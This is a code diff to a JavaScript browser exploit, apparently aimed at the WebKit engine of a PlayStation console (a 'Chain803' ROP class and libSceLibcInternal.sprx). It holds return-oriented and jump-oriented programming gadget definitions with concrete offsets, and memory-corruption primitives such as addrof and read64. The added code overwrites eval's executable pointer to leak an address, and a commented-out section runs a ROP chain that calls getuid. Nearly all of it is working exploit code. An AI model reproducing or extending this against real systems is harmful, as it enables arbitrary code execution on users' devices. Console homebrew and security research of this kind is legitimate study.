@@ -73,6 +73,11 @@ let libkernel_base = null;
 // libSceLibcInternal.sprx
 let libc_base = null;
 
+// search for the JOP gadgets
+
+// e.g. jop1:
+// 'mov rdi, qword ptr [rdi + 0x30] ; mov rax qword ptr [rdi] ; jmp qword ptr [rax + 8]
+
 // gadgets for the JOP chain
 const jop1 = `
 mov rdi, qword ptr [rdi + 0x30]
@@ -109,29 +114,33 @@ const jop5 = 'pop rsp; ret';
 //     pop rbp
 const rop_epilogue = 'leave; ret';
 
+// put missing offset for instruction
+// e.g.
+//     'pop rax; ret' : 0x<offset>,
+/*
 const webkit_gadget_offsets = new Map(Object.entries({
-    'pop rax; ret' : 0x0000000000035a1b,
-    'pop rbx; ret' : 0x000000000001537c,
-    'pop rcx; ret' : 0x0000000000025ecb,
-    'pop rdx; ret' : 0x0000000000060f52,
+    'pop rax; ret' : ,
+    'pop rbx; ret' : ,
+    'pop rcx; ret' : ,
+    'pop rdx; ret' : ,
 
-    'pop rbp; ret' : 0x00000000000000b6,
-    'pop rsi; ret' : 0x000000000003bd77,
-    'pop rdi; ret' : 0x00000000001e3f87,
-    'pop rsp; ret' : 0x00000000000bf669,
+    'pop rbp; ret' : ,
+    'pop rsi; ret' : ,
+    'pop rdi; ret' : ,
+    'pop rsp; ret' : ,
 
-    'pop r8; ret' : 0x0000000000097442,
-    'pop r9; ret' : 0x00000000006f501f,
-    'pop r10; ret' : 0x0000000000060f51,
-    'pop r11; ret' : 0x0000000000d2a629,
+    'pop r8; ret' : ,
+    'pop r9; ret' : ,
+    'pop r10; ret' : ,
+    'pop r11; ret' : ,
 
-    'pop r12; ret' : 0x0000000000d8968d,
-    'pop r13; ret' : 0x00000000016ccff1,
-    'pop r14; ret' : 0x000000000003bd76,
-    'pop r15; ret' : 0x00000000002499df,
+    'pop r12; ret' : ,
+    'pop r13; ret' : ,
+    'pop r14; ret' : ,
+    'pop r15; ret' : ,
 
-    'ret' : 0x0000000000000032,
-    'leave; ret' : 0x0000000000291fd7,
+    'ret' : ,
+    'leave; ret' : ,
 
     'neg rax; and rax, rcx; ret' : 0x0000000000e85f24,
     'adc esi, esi; ret' : 0x000000000088cbb9,
@@ -145,11 +154,12 @@ const webkit_gadget_offsets = new Map(Object.entries({
     'mov qword ptr [rdi], rax; ret' : 0x000000000005b1bb,
     'mov rdx, rcx; ret' : 0x0000000000eae9fd,
 
-    [jop1] : 0x000000000028a8d0,
-    [jop2] : 0x000000000076b970,
-    [jop3] : 0x0000000000202698,
-    [jop4] : 0x00000000021af6ad,
+    [jop1] : ,
+    [jop2] : ,
+    [jop3] : ,
+    [jop4] : ,
 }));
+*/
 
 const libc_gadget_offsets = new Map(Object.entries({
     'neg rax; ret' : 0x00000000000d3503,
@@ -167,6 +177,7 @@ function get_bases() {
     const textarea_vtable = webcore_textarea.readp(0);
     const libwebkit_base = find_base(textarea_vtable, true, true);
 
+    /*
     const stack_chk_fail_import =
         libwebkit_base
         .add(offset_wk_stack_chk_fail)
@@ -181,11 +192,12 @@ function get_bases() {
     const memcpy_import = libwebkit_base.add(offset_wk_memcpy);
     const memcpy_addr = resolve_import(memcpy_import, true, true);
     const libc_base = find_base(memcpy_addr, true, true);
+    */
 
     return [
         libwebkit_base,
-        libkernel_base,
-        libc_base,
+        //libkernel_base,
+        //libc_base,
     ];
 }
 
@@ -324,6 +336,7 @@ class Chain803 extends ChainBase {
     clean() {
         super.clean();
         this._clean_branch_ctx();
+        this.is_saved = false;
     }
 
     // Use start_branch() and end_branch() to delimit a ROP chain that will
@@ -521,17 +534,48 @@ class Chain803 extends ChainBase {
 const Chain = Chain803;
 
 function rop() {
-    const jmp_buf = new Uint8Array(jmp_buf_size);
-    const jmp_buf_p = get_view_vector(jmp_buf);
-    [libwebkit_base, libkernel_base, libc_base] = get_bases();
+    //const jmp_buf = new Uint8Array(jmp_buf_size);
+    //const jmp_buf_p = get_view_vector(jmp_buf);
+    //[libwebkit_base, libkernel_base, libc_base] = get_bases();
+    [libwebkit_base] = get_bases();
 
-    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
-    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
-    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
-    debug_log('syscall_array:');
-    debug_log(syscall_array);
-    Chain.init_class(gadgets, syscall_array);
+    const view = new Uint8Array(1);
+    const vector = get_view_vector(view);
 
+    const offset = 0x0000000000093de0;
+    // mov rax, qword ptr [rdi + 0x30]; ret
+    const insn = libwebkit_base.add(offset);
+    const func = mem.addrof(eval).readp(offset_func_exec);
+    func.write64(0x38, insn);
+
+    const obj = {a : 0};
+    const res = eval(create_jsvalue(vector));
+    obj.a = res;
+
+    // read inline property
+    const res2 = mem.addrof(obj).read64(offset_js_inline_property);
+    debug_log(`res2: ${res2}`);
+    debug_log(`vector: ${vector}`);
+
+    //init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
+    //init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
+    //init_syscall_array(syscall_array, libkernel_base, 300 * KB);
+    //debug_log('syscall_array:');
+    //debug_log(syscall_array);
+    //Chain.init_class(gadgets, syscall_array);
+
+    /*
+    const chain = new Chain();
+    chain.push_gadget('leave; ret');
+
+    // The ROP chain is a noop. If we crashed, then we did something wrong.
+    alert('chain run');
+    chain.run()
+    alert('returned successfully');
+    */
+
+
+    /*
     setjmp_addr = gadgets.get('setjmp');
     longjmp_addr = gadgets.get('longjmp');
 
@@ -639,6 +683,7 @@ function rop() {
     if (chain.return_value.low() === magic) {
         die('syscall getuid failed');
     }
+    */
 }
 
 rop();
